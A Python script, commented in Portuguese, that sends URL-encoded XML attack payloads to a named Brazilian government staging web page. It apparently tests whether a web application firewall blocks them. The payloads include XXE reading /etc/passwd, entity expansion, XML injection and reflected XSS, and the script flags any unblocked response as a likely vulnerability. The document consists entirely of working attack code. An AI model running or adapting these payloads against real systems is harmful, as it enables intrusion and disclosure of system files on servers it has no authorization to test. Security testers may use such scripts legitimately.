import requests
from bs4 import BeautifulSoup

# Configurações iniciais
url_base = "https://sone.codatahml.pb.gov.br/index.php?page=user-poll.php"
headers = {
    "User-Agent": "Mozilla/5.0 ..."
}

# Payloads para testar
payloads = {
    'XML Entity Injection': "<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]><test>&xxe;</test>",
    'XML Entity Expansion': "<!DOCTYPE bomb [<!ENTITY a '1234567890' >]><bomb>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</bomb>",
    'XML Injection': "<test>test</test><script>alert('XML Injection')</script>",
    'Reflected XSS via XML Injection': "<test><name><![CDATA[<script>alert('XSS')</script>]]></name></test>"
}

# Função para enviar a requisição e verificar a resposta
def enviar_requisicao_e_verificar_resposta(url_completa, tipo_vulnerabilidade, teste_numero):
    resposta_teste = requests.get(url_completa, headers=headers)
    soup = BeautifulSoup(resposta_teste.text, 'html.parser')
    titulo = soup.find('title').text if soup.find('title') else ''

    print(f"Teste {teste_numero}: Testando '{tipo_vulnerabilidade}'. Título: {titulo[:46]}")
    
    if titulo != "Acesso Bloqueado":
        print(f"Teste #{teste_numero} PASSOU: Vulnerabilidade de '{tipo_vulnerabilidade}' possivelmente encontrada!")
        return 1
    else:
        print(f"Teste #{teste_numero} FALHOU: Acesso bloqueado.")
        return 0

# Contadores para os resultados dos testes
total_testes = 0
testes_passaram = 0
testes_falharam = 0

# Realizar os testes
for tipo_vulnerabilidade, payload in payloads.items():
    total_testes += 1
    # URL encode do payload XML para garantir que ele seja enviado corretamente
    payload_encoded = requests.utils.quote(payload)
    url_completa = f"{url_base}&xml={payload_encoded}&xml-validator-php-submit-button=Validate+XML"
    resultado_teste = enviar_requisicao_e_verificar_resposta(url_completa, tipo_vulnerabilidade, total_testes)
    if resultado_teste == 1:
        testes_passaram += 1
    else:
        testes_falharam += 1

# Reportar os resultados finais
print(f"\nTotal de Testes: {total_testes}")
print(f"Testes Passaram: {testes_passaram}")
print(f"Testes Falharam: {testes_falharam}")